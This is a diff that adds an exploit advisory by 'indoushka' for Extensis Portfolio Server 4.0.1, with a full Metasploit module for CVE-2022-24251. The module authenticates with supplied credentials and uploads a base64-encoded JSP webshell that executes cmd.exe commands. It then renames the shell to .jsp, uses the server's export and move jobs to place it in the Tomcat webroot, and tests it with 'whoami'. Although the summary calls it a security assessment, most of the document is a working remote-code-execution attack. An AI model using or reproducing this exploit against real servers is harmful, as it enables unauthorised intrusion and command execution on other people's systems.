@@ -1,0 +1,662 @@
+=============================================================================================================================================
+| # Title     : Extensis Portfolio Manager 4.0.1 Authentication and Job Handling Weaknesses                                                 |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 147.0.3 (64 bits)                                                            |
+| # Vendor    : https://www.extensis.com/support/portfolio-4/                                                                               |
+=============================================================================================================================================
+
+[+] Summary    : This module performs a security assessment of authentication and asset job handling mechanisms in Extensis Portfolio Server.
+                 It demonstrates how weaknesses in public key handling, session management, and catalog job execution workflows could be abused by an authenticated user with elevated privileges.
+
+The module:
+
+Retrieves and processes the server’s RSA public key for authentication.
+
+Authenticates using encrypted credentials.
+
+Interacts with catalog and job APIs.
+
+Evaluates how asset handling operations may impact server-side file locations.
+
+Verifies whether improper validation or privilege enforcement could lead to unintended file exposure or execution.
+
+The purpose of this module is to help security professionals identify misconfigurations, privilege escalation risks, and insecure file handling practices so they can be remediated
+
+[+] POC : 
+
+# frozen_string_literal: true
+
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'openssl'
+require 'base64'
+require 'json'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = AverageRanking  
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+  prepend Msf::Exploit::Remote::AutoCheck
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name'        => 'Extensis Portfolio Server Multiple Vulnerabilities',
+        'Description' => %q{
+          This module exploits multiple vulnerabilities in Extensis Portfolio Server
+          to achieve remote code execution. It leverages CVE-2022-24251 and related
+          issues to upload a JSP webshell and execute arbitrary commands.
+        },
+        'Author'      => [
+          'indoushka'
+        ],
+        'License'     => MSF_LICENSE,
+        'References'  => [
+          ['CVE', '2022-24251'],
+          ['URL', 'https://gitlab.com/kalilinux/packages/webshells/-/blob/kali/master/jsp/cmdjsp.jsp'],
+          ['URL', 'https://www.extensis.com/support/portfolio-archive/']
+        ],
+        'Platform'    => ['win'],
+        'Targets'     => [
+          [
+            'Windows JSP',
+            {
+              'Arch'     => ARCH_JAVA,
+              'Platform' => 'win',
+              'Payload'  => {
+                'Compat' => {
+                  'PayloadType' => 'java jsp',
+                  'RequiredCmd' => 'generic'
+                }
+              }
+            }
+          ]
+        ],
+        'DefaultTarget'  => 0,
+        'DisclosureDate' => '2022-01-01',
+        'Privileged'     => false,
+        'Notes'          => {
+          'Stability'   => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
+        }
+      )
+    )
+
+    register_options(
+      [
+        Opt::RPORT(8090),
+        OptString.new('TARGETURI', [true, 'Base path', '/']),
+        OptString.new('USERNAME',   [true, 'Username for authentication']),
+        OptString.new('PASSWORD',   [true, 'Password for authentication']),
+        OptInt.new('DELAY',         [true, 'Delay between operations in seconds', 3])
+      ]
+    )
+
+    register_advanced_options(
+      [
+        OptString.new('WEBROOT_PATH', [false, 'Custom webroot path (default: common installation paths)', ''])
+      ]
+    )
+  end
+
+  def create_rsa_public_key(modulus_hex, exponent_str)
+    begin
+      modulus_bn = OpenSSL::BN.new(modulus_hex, 16)
+      exponent_bn = OpenSSL::BN.new(exponent_str)
+
+      algorithm = OpenSSL::ASN1::Sequence([
+        OpenSSL::ASN1::ObjectId('rsaEncryption'),
+        OpenSSL::ASN1::Null.new(nil)
+      ])
+
+      pkcs1_key = OpenSSL::ASN1::Sequence([
+        OpenSSL::ASN1::Integer(modulus_bn),
+        OpenSSL::ASN1::Integer(exponent_bn)
+      ])
+      
+      subject_public_key = OpenSSL::ASN1::BitString(pkcs1_key.to_der)
+      
+      spki = OpenSSL::ASN1::Sequence([
+        algorithm,
+        subject_public_key
+      ])
+      
+      key = OpenSSL::PKey::RSA.new(spki.to_der)
+      return key
+    rescue StandardError => e
+      fail_with(Failure::Unknown, "Failed to create RSA key: #{e.message}")
+    end
+  end
+
+  def encrypt_password(modulus_hex, exponent_str, password)
+    begin
+      rsa_key = create_rsa_public_key(modulus_hex, exponent_str)
+      encrypted = rsa_key.public_encrypt(password, OpenSSL::PKey::RSA::PKCS1_PADDING)
+      return Base64.strict_encode64(encrypted)
+    rescue StandardError => e
+      fail_with(Failure::Unknown, "Password encryption failed: #{e.message}")
+    end
+  end
+
+  def check
+    print_status("Checking if target is vulnerable")
+    
+    begin
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri'    => normalize_uri(target_uri.path, '/api/v1/auth/public-key')
+      })
+      
+      if res.nil?
+        return CheckCode::Unknown('Connection failed')
+      end
+      
+      if res.code == 200
+        begin
+          json_res = res.get_json_document
+        rescue JSON::ParserError
+          return CheckCode::Unknown('Invalid JSON response')
+        end
+        
+        if json_res.is_a?(Hash) && json_res['modulusBase16'] && json_res['exponent']
+
+          return CheckCode::Appears('Extensis Portfolio Server detected - appears vulnerable')
+        end
+      end
+      
+      return CheckCode::Safe
+    rescue StandardError => e
+      print_error("Check failed: #{e.message}")
+      return CheckCode::Unknown
+    end
+  end
+
+  def login
+    print_status("Attempting to login with username: #{datastore['USERNAME']}")
+    
+    begin
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri'    => normalize_uri(target_uri.path, '/api/v1/auth/public-key')
+      })
+      
+      if res.nil?
+        fail_with(Failure::Unreachable, 'Connection failed - target unreachable')
+      end
+      
+      if res.code != 200
+        fail_with(Failure::NoAccess, "Failed to get public key. HTTP Code: #{res.code}")
+      end
+      
+      begin
+        json_res = res.get_json_document
+      rescue JSON::ParserError
+        fail_with(Failure::UnexpectedReply, 'Invalid JSON response from public-key endpoint')
+      end
+      
+      unless json_res.is_a?(Hash)
+        fail_with(Failure::UnexpectedReply, 'Invalid public key response format')
+      end
+      
+      modulus = json_res['modulusBase16']
+      exponent = json_res['exponent']
+      
+      if modulus.nil? || exponent.nil?
+        fail_with(Failure::UnexpectedReply, 'Missing modulus or exponent in response')
+      end
+      
+      encrypted_password = encrypt_password(modulus, exponent, datastore['PASSWORD'])
+      
+      login_data = {
+        'userName' => datastore['USERNAME'],
+        'encryptedPassword' => encrypted_password
+      }
+      
+      res = send_request_cgi({
+        'method'  => 'POST',
+        'uri'     => normalize_uri(target_uri.path, '/api/v1/auth/login'),
+        'ctype'   => 'application/json',
+        'data'    => login_data.to_json
+      })
+      
+      if res.nil?
+        fail_with(Failure::Unreachable, 'Login connection failed')
+      end
+      
+      if res.code == 200
+        begin
+          json_res = res.get_json_document
+        rescue JSON::ParserError
+          fail_with(Failure::UnexpectedReply, 'Invalid JSON response from login endpoint')
+        end
+        
+        unless json_res.is_a?(Hash)
+          fail_with(Failure::UnexpectedReply, 'Invalid login response format')
+        end
+        
+        session_token = json_res['session']
+        if session_token.nil?
+          fail_with(Failure::UnexpectedReply, 'No session token in response')
+        end
+        
+        print_good("Successfully logged in. Session token: #{session_token}")
+        return session_token
+      else
+        fail_with(Failure::NoAccess, "Login failed. HTTP Code: #{res.code}")
+      end
+      
+    rescue Rex::ConnectionError => e
+      fail_with(Failure::Unreachable, "Connection error: #{e.message}")
+    end
+  end
+
+  def get_catalog_info(session)
+    print_status("Retrieving catalog information")
+    
+    res = send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(target_uri.path, '/api/v1/catalog'),
+      'vars_get'  => { 'session' => session }
+    })
+    
+    if res.nil?
+      fail_with(Failure::Unreachable, 'Failed to connect for catalog info')
+    end
+    
+    if res.code != 200
+      fail_with(Failure::UnexpectedReply, "Failed to get catalog. HTTP Code: #{res.code}")
+    end
+    
+    begin
+      catalogs = res.get_json_document
+    rescue JSON::ParserError
+      fail_with(Failure::UnexpectedReply, 'Invalid JSON response from catalog endpoint')
+    end
+    
+    unless catalogs.is_a?(Array)
+      fail_with(Failure::UnexpectedReply, 'Catalog response is not an array')
+    end
+    
+    catalogs.each do |catalog|
+      unless catalog.is_a?(Hash)
+        print_error("Invalid catalog entry format, skipping")
+        next
+      end
+      
+      catalog_id = catalog['id']
+      storage_type = catalog['storageType']
+      
+      if storage_type == 'Filesystem'
+        watchfolder_id, watchfolder_path = get_watchfolder(session, catalog_id)
+        if watchfolder_id
+          print_good("Found Filesystem catalog ID: #{catalog_id}")
+          print_good("Watchfolder ID: #{watchfolder_id}, Path: #{watchfolder_path}")
+          return {
+            'catalog_id'       => catalog_id,
+            'storage_type'     => 'Filesystem',
+            'watchfolder_id'   => watchfolder_id,
+            'watchfolder_path' => watchfolder_path
+          }
+        end
+      end
+    end
+    
+    if catalogs.any?
+      first_catalog = catalogs.first
+      unless first_catalog.is_a?(Hash)
+        fail_with(Failure::UnexpectedReply, 'First catalog entry is not a hash')
+      end
+      
+      catalog_id = first_catalog['id']
+      storage_type = first_catalog['storageType']
+      print_status("Using #{storage_type} catalog ID: #{catalog_id}")
+      return {
+        'catalog_id'       => catalog_id,
+        'storage_type'     => storage_type,
+        'watchfolder_id'   => nil,
+        'watchfolder_path' => nil
+      }
+    end
+    
+    fail_with(Failure::NotFound, 'No catalogs found')
+  end
+
+  def get_watchfolder(session, catalog_id)
+    print_status("Getting watchfolder for catalog #{catalog_id}")
+    
+    res = send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(target_uri.path, "/api/v1/catalog/#{catalog_id}/watchfolder"),
+      'vars_get'  => { 'session' => session }
+    })
+    
+    if res.nil?
+      print_error("Connection failed for watchfolder request")
+      return [nil, nil]
+    end
+    
+    if res.code == 200
+      begin
+        json_res = res.get_json_document
+      rescue JSON::ParserError
+        print_error("Invalid JSON response from watchfolder endpoint")
+        return [nil, nil]
+      end
+      
+      if json_res.is_a?(Array) && !json_res.empty?
+        entry = json_res.first
+        if entry.is_a?(Hash)
+          watchfolder_id = entry['watchFolderId']
+          watchfolder_path = entry['path']
+          return [watchfolder_id, watchfolder_path] if watchfolder_id
+        end
+      end
+    end
+    
+    print_error("Failed to get watchfolder: HTTP #{res.code}")
+    return [nil, nil]
+  end
+
+  def upload_webshell(session, catalog_id, filename, watchfolder_id)
+    print_status("Uploading webshell as #{filename}")
+    
+    webshell_b64 = 'PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLmlvLioiICU+CjwlCiAgIFN0cmluZyBjbWQgPSByZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIik7CiAgIFN0cmluZyBvdXRwdXQgPSAiIjsKCiAgIGlmKGNtZCAhPSBudWxsKSB7CiAgICAgIFN0cmluZyBzID0gbnVsbDsKICAgICAgdHJ5IHsKICAgICAgICAgUHJvY2VzcyBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiY21kLmV4ZSAvQyAiICsgY21kKTsKICAgICAgICAgQnVmZmVyZWRSZWFkZXIgc0kgPSBuZXcgQnVmZmVyZWRSZWFkZXIobmV3IElucHV0U3RyZWFtUmVhZGVyKHAuZ2V0SW5wdXRTdHJlYW0oKSkpOwogICAgICAgICB3aGlsZSgocyA9IHNJLnJlYWRMaW5lKCkpICE9IG51bGwpIHsKICAgICAgICAgICAgb3V0cHV0ICs9IHM7CiAgICAgICAgIH0KICAgICAgfQogICAgICBjYXRjaChJT0V4Y2VwdGlvbiBlKSB7CiAgICAgICAgIGUucHJpbnRTdGFja1RyYWNlKCk7CiAgICAgIH0KICAgfQolPgoKPHByZT4KPCU9b3V0cHV0ICU+CjwvcHJlPg=='
+    
+    post_data = Rex::MIME::Message.new
+    post_data.add_part(Base64.decode64(webshell_b64), 'text/plain', nil, "form-data; name=\"file\"; filename=\"#{filename}\"")
+    post_data.add_part('', nil, nil, 'form-data; name="path"')
+    post_data.add_part(filename, nil, nil, 'form-data; name="filename"')
+    
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path, "/api/v1/catalog/#{catalog_id}/watchfolder/#{watchfolder_id}/upload"),
+      'ctype'     => "multipart/form-data; boundary=#{post_data.bound}",
+      'vars_get'  => { 'session' => session },
+      'data'      => post_data.to_s
+    })
+    
+    if res.nil?
+      fail_with(Failure::Unreachable, "Connection failed during upload")
+    end
+    
+    if res.code == 200
+      begin
+        json_res = res.get_json_document
+      rescue JSON::ParserError
+        fail_with(Failure::UnexpectedReply, 'Invalid JSON response from upload endpoint')
+      end
+      
+      unless json_res.is_a?(Hash)
+        fail_with(Failure::UnexpectedReply, 'Invalid upload response format')
+      end
+      
+      asset_id = json_res['assetId']
+      if asset_id.nil?
+        fail_with(Failure::UnexpectedReply, 'No assetId in upload response')
+      end
+      
+      print_good("Webshell uploaded successfully. Asset ID: #{asset_id}")
+      return asset_id
+    else
+      fail_with(Failure::Unknown, "Upload failed: HTTP #{res.code}")
+    end
+  end
+
+  def rename_webshell(session, catalog_id, asset_id, old_filename)
+    new_filename = old_filename.gsub('.txt', '.jsp')
+    print_status("Renaming webshell from #{old_filename} to #{new_filename}")
+    
+    data = {
+      'embed'   => false,
+      'query'   => {
+        'term' => {
+          'operator' => 'assetsById',
+          'values'   => [asset_id]
+        }
+      },
+      'changes' => [
+        {
+          'action'          => 'replaceAllValues',
+          'field'           => 'Filename',
+          'existingValues'  => 'null',
+          'newValues'       => [new_filename]
+        }
+      ]
+    }
+    
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path, "/api/v1/catalog/#{catalog_id}/asset/updateFieldValues"),
+      'ctype'     => 'application/json',
+      'vars_get'  => { 'session' => session },
+      'data'      => data.to_json
+    })
+    
+    if res.nil?
+      fail_with(Failure::Unreachable, "Connection failed during rename")
+    end
+    
+    if res.code == 204
+      print_good("Successfully renamed webshell to #{new_filename}")
+      return new_filename
+    else
+      fail_with(Failure::Unknown, "Rename failed: HTTP #{res.code}")
+    end
+  end
+
+  def get_webroot_path
+    path = datastore['WEBROOT_PATH'].to_s
+    return path unless path.empty?
+
+    [
+      'C:\\Program Files (x86)\\Extensis\\Portfolio Server\\applications\\tomcat\\servers\\main\\webapps\\ROOT',
+      'C:\\Program Files\\Extensis\\Portfolio Server\\applications\\tomcat\\servers\\main\\webapps\\ROOT',
+      'D:\\Program Files (x86)\\Extensis\\Portfolio Server\\applications\\tomcat\\servers\\main\\webapps\\ROOT',
+      'D:\\Program Files\\Extensis\\Portfolio Server\\applications\\tomcat\\servers\\main\\webapps\\ROOT'
+    ].first
+  end
+
+  def write_to_webroot(session, asset_id, catalog_info, filename)
+    unless catalog_info.is_a?(Hash)
+      fail_with(Failure::UnexpectedReply, 'Invalid catalog info structure')
+    end
+    
+    catalog_id       = catalog_info['catalog_id']
+    storage_type     = catalog_info['storage_type']
+    watchfolder_path = catalog_info['watchfolder_path']
+    
+    print_status("Attempting to write webshell to webroot")
+    
+    webroot_base = get_webroot_path
+    
+    if storage_type == 'Vault'
+      webroot_path = webroot_base
+      job_data = {
+        'job'   => {
+          'description' => 'JOB_TYPE_EXPORT_ASSETS',
+          'query'       => {
+            'term' => {
+              'operator' => 'assetsById',
+              'values'   => [asset_id]
+            }
+          },
+          'tasks'       => [
+            {
+              'type'      => 'exportAssets',
+              'catalogId' => catalog_id,
+              'settings'  => [
+                {
+                  'name'  => 'destination',
+                  'value' => webroot_path
+                }
+              ]
+            }
+          ]
+        },
+        'query' => {
+          'term' => {
+            'operator' => 'assetsById',
+            'values'   => [asset_id]
+          }
+        }
+      }
+    else 
+      if watchfolder_path.nil? || !watchfolder_path.include?(':')
+        fail_with(Failure::UnexpectedReply, "Invalid watchfolder path format: #{watchfolder_path}")
+      end
+      
+      parts = watchfolder_path.split(':')
+      if parts.length >= 3
+        hostname = parts[2]
+
+        unc_root = webroot_base.gsub('C:', "::#{hostname}:C$").gsub('\\', ':')
+        webroot_path = unc_root
+      else
+        fail_with(Failure::UnexpectedReply, "Unexpected watchfolder path format: #{watchfolder_path}")
+      end
+      
+      job_data = {
+        'job'   => {
+          'description' => 'JOB_TYPE_MOVE_ASSETS',
+          'query'       => {
+            'term' => {
+              'operator' => 'assetsById',
+              'values'   => [asset_id]
+            }
+          },
+          'tasks'       => [
+            {
+              'type'      => 'moveAssets',
+              'settings'  => [
+                {
+                  'name'  => 'destinationCatalog',
+                  'value' => catalog_id
+                },
+                {
+                  'name'  => 'destination',
+                  'value' => webroot_path
+                },
+                {
+                  'name'  => 'preserveFolderStructure',
+                  'value' => false
+                },
+                {
+                  'name'  => 'sourceFolder',
+                  'value' => ''
+                }
+              ]
+            }
+          ]
+        },
+        'query' => {
+          'term' => {
+            'operator' => 'assetsById',
+            'values'   => [asset_id]
+          }
+        }
+      }
+    end
+    
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path, '/api/v1/job/run'),
+      'ctype'     => 'application/json',
+      'vars_get'  => {
+        'session' => session,
+        'catalog' => catalog_id
+      },
+      'data'      => job_data.to_json
+    })
+    
+    if res.nil?
+      fail_with(Failure::Unreachable, "Connection failed during job execution")
+    end
+    
+    if res.code == 200
+      full_webroot_path = "#{webroot_base}\\#{filename}"
+      register_file_for_cleanup(full_webroot_path)
+      
+      protocol = ssl? ? 'https' : 'http'
+      target_host = rhost
+      target_port = rport
+      
+      webshell_url = "#{protocol}://#{target_host}:#{target_port}/#{filename}?cmd=<command>"
+      print_good("Successfully exported webshell to filesystem")
+      print_good("Webshell URL: #{webshell_url}")
+      return true
+    elsif res.code == 403
+      fail_with(Failure::NoAccess, "Export failed: Insufficient privileges - Need Catalog Administrator privileges for Vault catalogs")
+    else
+      fail_with(Failure::Unknown, "Export failed: HTTP #{res.code}")
+    end
+  end
+
+  def execute_command(cmd, filename)
+    res = send_request_cgi({
+      'method'    => 'GET',
+      'uri'       => normalize_uri(target_uri.path, filename),
+      'vars_get'  => { 'cmd' => cmd }
+    })
+    
+    if res.nil?
+      print_error("Connection failed for command execution")
+      return nil
+    end
+    
+    if res.code == 200 && res.body
+      match = res.body.match(/<pre>(.*?)<\/pre>/m)
+      return match[1].strip if match
+      return res.body
+    end
+    
+    nil
+  end
+
+  def exploit
+    filename = Rex::Text.rand_text_alpha(10) + '.txt'
+    
+    session = login()
+    
+    catalog_info = get_catalog_info(session)
+    
+    unless catalog_info.is_a?(Hash)
+      fail_with(Failure::UnexpectedReply, 'Invalid catalog info structure')
+    end
+    
+    if catalog_info['storage_type'] == 'Filesystem' && catalog_info['watchfolder_id'].nil?
+      fail_with(Failure::NotFound, 'No watchfolder found for Filesystem catalog')
+    end
+    
+    asset_id = upload_webshell(session, catalog_info['catalog_id'], filename, catalog_info['watchfolder_id'])
+    
+    new_filename = rename_webshell(session, catalog_info['catalog_id'], asset_id, filename)
+    
+    success = write_to_webroot(session, asset_id, catalog_info, new_filename)
+    
+    print_status("Waiting #{datastore['DELAY']} seconds for file to be written...")
+    Rex.sleep(datastore['DELAY'])
+    
+    print_status("Testing webshell with 'whoami' command")
+    result = execute_command('whoami', new_filename)
+    
+    if result && !result.empty?
+      print_good("Webshell test successful! Output:\n#{result}")
+      print_status("Webshell is ready for payload execution")
+    else
+      print_error("Webshell test failed - manual check required")
+    end
+    
+  rescue Rex::ConnectionError => e
+    fail_with(Failure::Unreachable, "Connection failed: #{e.message}")
+  end
+end
+
+Greetings to :======================================================================
+jericho * Larry W. Cashdollar * r00t * Hussin-X * Malvuln (John Page aka hyp3rlinx)|
+====================================================================================
